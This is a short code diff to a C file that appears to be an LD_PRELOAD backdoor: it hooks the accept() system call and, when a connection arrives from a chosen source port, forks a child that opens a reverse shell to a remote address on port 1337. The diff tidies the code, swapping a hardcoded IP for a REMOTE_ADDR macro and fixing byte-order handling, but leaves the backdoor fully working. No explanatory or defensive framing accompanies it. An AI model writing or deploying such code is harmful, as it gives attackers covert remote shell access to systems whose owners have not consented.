@@ -22,14 +22,14 @@
 #define REMOTE_PORT 1337
 
 
-void *rev_shell(void){
+void rev_shell(void){
   int port = REMOTE_PORT;
   struct sockaddr_in revsockaddr;
 
   int sockt = socket(AF_INET, SOCK_STREAM, 0);
   revsockaddr.sin_family = AF_INET;
   revsockaddr.sin_port = htons(port);
-  revsockaddr.sin_addr.s_addr = inet_addr("192.168.172.1");
+  revsockaddr.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
 
   connect(sockt, (struct sockaddr *) &revsockaddr,
   sizeof(revsockaddr));
@@ -67,13 +67,14 @@ int accept(int sockfd, struct sockaddr * addr, socklen_t * addrlen){
 	real_accept = dlsym(RTLD_NEXT, "accept");
     pid_t my_pid;
 
-    struct sockaddr_in *sa_i = (struct sockaddr_in *) addr;
+    struct sockaddr_in *sock_in = (struct sockaddr_in *) addr;
 
-    if (htons (sa_i->sin_port) == SRCPORT) {
-    my_pid = fork ();
-    if (my_pid == 0) {
-      rev_shell();
-    }
+
+    if (ntohs(sock_in->sin_port) == SRCPORT) {
+        my_pid = fork ();
+        if (my_pid == 0) {
+          rev_shell();
+        }
   }
   return real_accept(sockfd, addr, addrlen);
 }
